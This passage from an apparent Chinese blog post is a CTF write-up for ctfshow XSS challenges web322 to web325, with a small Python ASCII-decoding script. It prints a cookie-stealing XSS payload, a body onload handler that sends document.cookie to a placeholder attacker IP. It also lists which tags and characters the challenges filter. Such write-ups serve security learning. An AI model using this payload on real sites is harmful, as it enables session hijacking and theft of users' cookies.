+<h4 id="ascii码转字符串脚本"><a href="#ascii码转字符串脚本" class="headerlink" title="ascii码转字符串脚本"></a>ascii码转字符串脚本</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">ascii_to_string</span>(<span class="params">ascii_str</span>):</span><br><span class="line">    <span class="comment"># 将以逗号分隔的ASCII码字符串分割成一个列表</span></span><br><span class="line">    ascii_list = ascii_str.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    <span class="comment"># 使用列表推导式将ASCII码转换为字符，并连接成一个字符串</span></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">int</span>(code)) <span class="keyword">for</span> code <span class="keyword">in</span> ascii_list)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"><span class="comment"># 输入以逗号分隔的ASCII码字符串</span></span><br><span class="line">ascii_str = <span class="built_in">input</span>(<span class="string">&quot;请输入以逗号分隔的ASCII码字符串: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用函数进行转换并打印结果</span></span><br><span class="line">string_result = ascii_to_string(ascii_str)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;转换后的字符串:&quot;</span>, string_result)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="web322"><a href="#web322" class="headerlink" title="web322"></a>web322</h2><h3 id="过滤xss"><a href="#过滤xss" class="headerlink" title="#过滤xss"></a>#过滤xss</h3><p>常规的先试试</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;body onload=&quot;document.location.href=&#x27;http://[ip]/xss.php?xss=&#x27;+document.cookie&quot;&gt;&lt;/body&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../image/achieve/202411/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0--ctfshow/image-20241120151233543.png" alt="image-20241120151233543"></p>
+<p>这样看的话是没什么问题的，还是跟之前一样是过滤了空格，但是我正常插入我的payload的时候发现没有跳转成功</p>
+<p>我一开始以为是我的标签被过滤了，然后换了几个都没成功，后面才发现是xss被过滤了</p>
+<p>然后我就把php代码里面的参数改成cookie就成功了(因为我上一题测试的时候把参数从cookie换成xss了，所以刚好碰到这道题过滤了xss，也算是刚好学到这道题了) </p>
+<p>注:后面发现好像不止过滤了xss，script和空格，还过滤了img，iframe，分号和逗号，各位可以去测试一下</p>
+<h2 id="web323"><a href="#web323" class="headerlink" title="web323"></a>web323</h2><p>跟322的做法一样，不过因为我最后不是发现了322过滤了其他的字符嘛，我就拿来测试了一下</p>
+<p><img src="/./../image/achieve/202411/xss--ctfshow/image-20241120153753204.png" alt="image-20241120153753204"></p>
+<p>确实是过滤了img标签</p>
+<p><img src="/./../image/achieve/202411/xss--ctfshow/image-20241120153647539.png" alt="image-20241120153647539"></p>
+<p>iframe标签也被过滤了</p>
+<p>剩下的符号我感觉跟payload暂时没什么关系，就不测了</p>
+<h2 id="web324"><a href="#web324" class="headerlink" title="web324"></a>web324</h2><p>跟322一样</p>
+<h2 id="web325"><a href="#web325" class="headerlink" title="web325"></a>web325</h2><p>跟上面一样，但我看别人的wp有说过滤了小数点，但可能是环境问题我没有发现有过滤这个</p>
 ]]></content>
       <categories>
         <category>ctfshow</category>
